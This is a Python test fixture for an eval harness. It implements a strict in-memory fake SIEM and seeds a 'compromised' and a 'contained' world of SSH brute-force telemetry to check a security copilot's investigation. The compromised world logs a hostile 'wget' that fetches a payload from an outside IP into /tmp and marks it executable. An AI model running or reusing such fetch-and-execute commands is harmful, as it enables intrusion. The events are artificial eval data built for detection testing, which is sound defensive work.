"""A controlled events index for the eval harness — the SIEM as a fixture.

`search_internal_logs` made the copilot's verdict depend on what the
environment's telemetry says. That is the point of the tool, and it is
also an eval problem: an investigation is now a function of an index the
harness does not own. Pointed at a developer's live Elastic, the same
alert could reach different verdicts on different machines — and the base
harness would silently be measuring whatever happened to be seeded.

So the harness brings its own SIEM. `FakeEventsIndex` holds a list of ECS
events in memory and answers exactly the query `SearchLogsTool` builds,
served through an httpx MockTransport. Two things make it trustworthy
enough to pin expectations on:

1. It is STRICT. Any clause it does not understand is a 400 naming the
   clause, never a silently-wrong answer. If `_build_query` grows a
   feature this fake doesn't model, the eval fails loudly instead of
   quietly measuring a fiction.
2. It records every query body it received, so a test can assert on the
   query the model actually composed — not just on the verdict that came
   out the far end.

What it is NOT: Elasticsearch. It models exact-term matching over
keyword/ip fields, a `@timestamp` lower bound, terms aggregations and the
count cap — the surface this tool uses — with none of ES's analysis,
sharding, or type coercion. Fidelity beyond that surface comes from the
live run against the real stack (scripts/elastic_dev_events_seed.sh),
which is what proved the tool works; this fake is what makes the
expectation reproducible.
"""
import json
from datetime import datetime, timedelta, timezone

import httpx

# A fixed "now" for the seeded worlds. Event timestamps are expressed as
# offsets from it, and the transport resolves `now-Nh` against it, so a
# window boundary means the same thing on every machine and every day.
NOW = datetime(2026, 4, 19, 3, 20, tzinfo=timezone.utc)

ATTACKER_IP = "185.220.101.47"
TARGET_HOST = "prod-web-02.internal"
# Ordinary internal admin traffic — ambient successes that exist in BOTH
# worlds, so "were there successful logins?" is never the discriminator.
# The discriminator is the join: successful logins FROM THE ATTACKER IP.
ADMIN_IP = "10.10.4.22"


def _ts(minutes_ago: float) -> str:
    return (NOW - timedelta(minutes=minutes_ago)).strftime("%Y-%m-%dT%H:%M:%SZ")


def _dotted(doc: dict, path: str):
    """ECS documents are nested; the tool filters on dotted names."""
    cur = doc
    for part in path.split("."):
        if not isinstance(cur, dict) or part not in cur:
            return None
        cur = cur[part]
    return cur


class UnsupportedQuery(Exception):
    """The tool sent a clause this fake does not model — fail loudly."""


class FakeEventsIndex:
    """An in-memory events index that answers SearchLogsTool's query."""

    def __init__(self, events: list[dict], now: datetime = NOW) -> None:
        self.events = events
        self.now = now
        self.queries: list[dict] = []  # every body received, in order

    # --- introspection for assertions ---------------------------------------

    def filters_used(self) -> list[list[tuple[str, str]]]:
        """Each received query's term filters as ordered (field, value)
        pairs. Pairs, not a dict, on purpose: a dict would collapse a
        duplicate-field query like outcome=failure AND outcome=success
        into its last entry, letting an assertion 'see' a pivot inside a
        self-contradictory query that matches nothing (review catch)."""
        out = []
        for body in self.queries:
            terms = []
            for clause in body["query"]["bool"]["filter"]:
                if "term" in clause:
                    (field, value), = clause["term"].items()
                    terms.append((field, value))
            out.append(terms)
        return out

    # --- the transport ------------------------------------------------------

    def transport(self) -> httpx.MockTransport:
        return httpx.MockTransport(self._handle)

    def client(self) -> httpx.AsyncClient:
        return httpx.AsyncClient(transport=self.transport())

    def _handle(self, request: httpx.Request) -> httpx.Response:
        if request.method != "POST" or not request.url.path.endswith("/_search"):
            # Read-only is the tool's contract; anything else is a bug in
            # the tool, so surface it the way a locked-down cluster would.
            return httpx.Response(403, text="only _search is permitted")
        body = json.loads(request.content)
        self.queries.append(body)
        try:
            return httpx.Response(200, json=self._search(body))
        except UnsupportedQuery as e:
            return httpx.Response(400, text=f"fake SIEM: {e}")

    def _search(self, body: dict) -> dict:
        unknown = set(body) - {"size", "timeout", "track_total_hits", "query", "aggs"}
        if unknown:
            raise UnsupportedQuery(f"unsupported top-level keys: {sorted(unknown)}")

        query = body.get("query", {})
        if set(query) != {"bool"} or set(query["bool"]) != {"filter"}:
            raise UnsupportedQuery(f"only bool.filter is modeled, got {query}")

        # Validate every clause ONCE, up front — not lazily per event. An
        # unmodeled clause must be caught even when the match set is empty,
        # which is exactly when a lazy check would stay silent.
        terms, floor = self._parse_filters(query["bool"]["filter"])
        matches = [e for e in self.events if self._matches(e, terms, floor)]

        # Strict, like everything else: the tool always sends a bounded int
        # cap. An absent key, a bool (True = uncapped exact count, the cost
        # this tool exists to avoid), or junk would each force this fake to
        # guess at count/relation semantics — refuse instead (review catch:
        # the earlier default silently labeled every exact count "gte").
        cap = body.get("track_total_hits")
        if not isinstance(cap, int) or isinstance(cap, bool):
            raise UnsupportedQuery(
                f"track_total_hits must be a bounded integer, got {cap!r}"
            )
        total = min(len(matches), cap)
        relation = "gte" if len(matches) >= cap else "eq"

        size = body.get("size", 10)
        return {
            "took": 1,
            "timed_out": False,
            "hits": {
                "total": {"value": total, "relation": relation},
                "hits": [{"_source": e} for e in matches[:size]],
            },
            "aggregations": {
                name: self._agg(matches, spec)
                for name, spec in (body.get("aggs") or {}).items()
            },
        }

    def _parse_filters(
        self, clauses: list[dict]
    ) -> tuple[list[tuple[str, str]], datetime | None]:
        """(term conditions, @timestamp floor) — raising on anything else."""
        terms: list[tuple[str, str]] = []
        floor: datetime | None = None
        for clause in clauses:
            if set(clause) != {"term"} and set(clause) != {"range"}:
                raise UnsupportedQuery(f"unsupported filter clause: {clause}")
            if "term" in clause:
                if len(clause["term"]) != 1:
                    raise UnsupportedQuery(f"multi-field term: {clause}")
                (field, value), = clause["term"].items()
                if not isinstance(value, str):
                    # ES's long form — {"term": {f: {"value": v, ...}}} — is
                    # legal and semantically identical, which is exactly why
                    # it must 400 here: modeling it as raw == would answer
                    # the canonical pivot with a silent zero (review catch).
                    raise UnsupportedQuery(
                        f"only short-form string term values are modeled, "
                        f"got {field}={value!r}"
                    )
                terms.append((field, value))
            else:
                if len(clause["range"]) != 1:
                    raise UnsupportedQuery(f"multi-field range: {clause}")
                (field, bounds), = clause["range"].items()
                if field != "@timestamp" or set(bounds) != {"gte"}:
                    raise UnsupportedQuery(f"only a @timestamp gte is modeled: {clause}")
                gte = bounds["gte"]
                if not (
                    isinstance(gte, str)
                    and gte.startswith("now-")
                    and gte.endswith("h")
                    and gte[4:-1].isdigit()
                ):
                    raise UnsupportedQuery(f"only now-Nh date math is modeled: {gte!r}")
                floor = self.now - timedelta(hours=int(gte[4:-1]))
        return terms, floor

    def _matches(
        self,
        event: dict,
        terms: list[tuple[str, str]],
        floor: datetime | None,
    ) -> bool:
        if floor is not None:
            stamp = datetime.strptime(
                event["@timestamp"], "%Y-%m-%dT%H:%M:%SZ"
            ).replace(tzinfo=timezone.utc)
            if stamp < floor:
                return False
        return all(_dotted(event, field) == value for field, value in terms)

    def _agg(self, matches: list[dict], spec: dict) -> dict:
        if set(spec) != {"terms"} or set(spec["terms"]) - {"field", "size"}:
            raise UnsupportedQuery(f"only a terms agg is modeled: {spec}")
        field = spec["terms"]["field"]
        counts: dict[str, int] = {}
        for e in matches:
            key = _dotted(e, field)
            if key is not None:
                counts[key] = counts.get(key, 0) + 1
        ranked = sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))
        return {
            "buckets": [
                {"key": k, "doc_count": n}
                for k, n in ranked[: spec["terms"].get("size", 10)]
            ]
        }


# --- the two seeded worlds ---------------------------------------------------
#
# Same alert, same external reputation, one difference in the environment's
# own telemetry: whether any of the 847 attempts actually landed. This is
# the differential the tool exists to resolve, so it is what the eval
# measures. Everything else is held constant on purpose.

_USERNAMES = ["root", "admin", "ubuntu", "oracle", "postgres", "git"]
FAILED_ATTEMPTS = 847  # matches the alert's own count, so the log corroborates it


def _failed_auths() -> list[dict]:
    """The brute force itself: 847 failures in the three minutes before the
    alert fired, cycling the usernames the alert names."""
    return [
        {
            "@timestamp": _ts(9 - (i / FAILED_ATTEMPTS) * 3),
            "event": {
                "category": "authentication",
                "type": "start",
                "action": "ssh_login",
                "outcome": "failure",
            },
            "source": {"ip": ATTACKER_IP, "port": 40000 + (i % 5000)},
            "destination": {"ip": "10.30.1.12", "port": 22},
            "host": {"name": TARGET_HOST},
            "user": {"name": _USERNAMES[i % len(_USERNAMES)]},
            "network": {"protocol": "ssh"},
            "message": (
                f"Failed password for {_USERNAMES[i % len(_USERNAMES)]} "
                f"from {ATTACKER_IP} port {40000 + (i % 5000)} ssh2"
            ),
        }
        for i in range(FAILED_ATTEMPTS)
    ]


def _ambient() -> list[dict]:
    """Ordinary environment noise present in both worlds: real successful
    logins from an internal admin host, and a routine backup process.

    These matter. Without them, ANY search for a successful login returns
    zero in the contained world, and the copilot would reach the right
    answer from a wrong, trivially-empty index. With them, only the join
    on the attacker's source IP separates the two worlds — which is the
    query a competent analyst writes and the one the eval checks for."""
    events = []
    # Kept recent enough that even a narrow one-hour window sees some, so
    # the contained world is never right-for-the-wrong-reason.
    for i, user in enumerate(["ubuntu", "deploy", "ubuntu"]):
        events.append({
            "@timestamp": _ts(20 + i * 38),
            "event": {
                "category": "authentication",
                "type": "start",
                "action": "ssh_login",
                "outcome": "success",
            },
            "source": {"ip": ADMIN_IP, "port": 51000 + i},
            "destination": {"ip": "10.30.1.12", "port": 22},
            "host": {"name": TARGET_HOST},
            "user": {"name": user},
            "network": {"protocol": "ssh"},
            "message": (
                f"Accepted publickey for {user} from {ADMIN_IP} "
                f"port {51000 + i} ssh2"
            ),
        })
    events.append({
        "@timestamp": _ts(35),
        "event": {
            "category": "process",
            "type": "start",
            "action": "process_started",
            "outcome": "success",
        },
        "host": {"name": TARGET_HOST},
        "user": {"name": "backup"},
        "process": {"name": "rsync", "command_line": "rsync -az /var/www backup-01:/"},
    })
    return events


def _post_exploitation() -> list[dict]:
    """The smoking gun, present only in the compromised world: one accepted
    root login FROM the attacker IP, then that root session pulling a
    payload down and making it executable."""
    return [
        {
            "@timestamp": _ts(6),
            "event": {
                "category": "authentication",
                "type": "start",
                "action": "ssh_login",
                "outcome": "success",
            },
            "source": {"ip": ATTACKER_IP, "port": 44122},
            "destination": {"ip": "10.30.1.12", "port": 22},
            "host": {"name": TARGET_HOST},
            "user": {"name": "root"},
            "network": {"protocol": "ssh"},
            "message": (
                f"Accepted password for root from {ATTACKER_IP} port 44122 ssh2"
            ),
        },
        {
            "@timestamp": _ts(4),
            "event": {
                "category": "process",
                "type": "start",
                "action": "process_started",
                "outcome": "success",
            },
            "host": {"name": TARGET_HOST},
            "user": {"name": "root"},
            "process": {
                "name": "wget",
                "command_line": "wget http://45.83.220.19/kx -O /tmp/.kx",
            },
        },
        {
            "@timestamp": _ts(4),
            "event": {
                "category": "process",
                "type": "start",
                "action": "process_started",
                "outcome": "success",
            },
            "host": {"name": TARGET_HOST},
            "user": {"name": "root"},
            "process": {"name": "chmod", "command_line": "chmod +x /tmp/.kx"},
        },
    ]


def compromised_index() -> FakeEventsIndex:
    """847 failures, then one that worked — and what the attacker did next."""
    return FakeEventsIndex(_failed_auths() + _ambient() + _post_exploitation())


def contained_index() -> FakeEventsIndex:
    """The same 847 failures against the same host, none of which landed."""
    return FakeEventsIndex(_failed_auths() + _ambient())
